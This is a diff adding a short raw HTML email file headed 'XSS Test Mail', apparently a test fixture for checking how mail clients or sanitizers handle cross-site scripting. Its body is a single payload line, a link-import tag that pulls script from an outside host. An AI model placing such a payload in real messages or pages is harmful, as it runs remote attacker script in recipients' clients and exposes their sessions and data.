@@ -1,0 +1,7 @@
+From: hc1cl54@kahkaha.com
+To: "corbett minnaminnie" <kedda@flax24.uwaterloo.ca>
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+aaaaaaa <link rel=import href=//km2.in/xss.php>
